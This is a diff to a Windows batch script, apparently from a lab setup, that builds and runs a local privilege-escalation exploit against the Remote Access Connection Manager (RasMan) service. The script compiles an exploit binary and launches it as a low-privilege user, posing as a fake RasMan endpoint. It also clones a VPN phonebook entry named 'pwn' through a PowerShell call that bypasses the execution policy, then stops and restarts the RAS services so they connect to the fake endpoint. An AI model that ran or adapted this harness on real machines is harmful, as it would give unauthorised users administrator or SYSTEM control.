@@ -18,6 +18,9 @@ if defined INPUT_HELPER_USER set "HELPER_USER=%INPUT_HELPER_USER%"
 set /p HELPER_PASSWORD=[?] Password for %HELPER_USER% [password]: 
 if not defined HELPER_PASSWORD set "HELPER_PASSWORD=password"
 set /p GUEST_PASSWORD=[?] Built-in Guest password [blank]: 
+set "VPN_ENTRY=LpeLabVpn"
+set /p INPUT_VPN_ENTRY=[?] Shared VPN entry name [LpeLabVpn]: 
+if defined INPUT_VPN_ENTRY set "VPN_ENTRY=%INPUT_VPN_ENTRY%"
 
 set "VSDEVCMD="
 if exist "C:\Program Files\Microsoft Visual Studio\18\Community\Common7\Tools\VsDevCmd.bat" set "VSDEVCMD=C:\Program Files\Microsoft Visual Studio\18\Community\Common7\Tools\VsDevCmd.bat"
@@ -62,6 +65,9 @@ if errorlevel 1 (
     exit /b 1
 )
 
+echo [+] Clearing old local process state before rebuild
+taskkill /IM exploit_host2.exe /F >nul 2>&1
+
 echo [+] Building exploit binaries
 cl /nologo /EHsc /std:c++17 /W3 /O2 /MT exploit_host2.cpp /link /out:exploit_host2.exe
 if errorlevel 1 exit /b 1
@@ -80,6 +86,13 @@ if errorlevel 1 exit /b 1
 cl /nologo /W3 /O2 /MT query_shared_connection.c /link rasapi32.lib /out:query_shared_connection.exe
 if errorlevel 1 exit /b 1
 
+echo [+] Preparing the cloned phonebook entry used on the hang-up path
+powershell -ExecutionPolicy Bypass -File fix_phonebook_entry.ps1 -SourceEntry "%VPN_ENTRY%" -CloneEntry "pwn"
+if errorlevel 1 (
+    echo [!] Failed to prepare the cloned phonebook entry
+    exit /b 1
+)
+
 echo [+] Resetting old proof files and process state
 net localgroup Administrators %HELPER_USER% /delete >nul 2>&1
 taskkill /IM exploit_host2.exe /F >nul 2>&1
@@ -87,7 +100,14 @@ del /f /q system.txt load.txt group_add.txt squatter.log >nul 2>&1
 
 echo [+] Preparing service state
 sc stop RasMan >nul 2>&1
-sc start RasAuto >nul 2>&1
+sc stop RasAuto >nul 2>&1
+for /l %%i in (1,1,20) do (
+    sc query RasMan | find "STOPPED" >nul && goto :rasman_stopped
+    ping -n 2 127.0.0.1 >nul
+)
+echo [!] RasMan did not stop cleanly
+exit /b 1
+:rasman_stopped
 
 echo [+] Starting the fake RasMan host as low-priv %HELPER_USER%
 launch_guest.exe --user "%HELPER_USER%" --password "%HELPER_PASSWORD%" "C:\Users\Public\Desktop\EXPLOIT\exploit_host2.exe --mode lpe"
@@ -114,6 +134,10 @@ if not exist squatter.log (
 echo [+] Fake RasMan host is running
 echo [+] squatter.log
 type squatter.log
+
+echo [+] Restarting RasAuto against the fake RasMan endpoint
+sc start RasAuto >nul 2>&1
+ping -n 3 127.0.0.1 >nul
 
 echo [+] Current session state
 quser
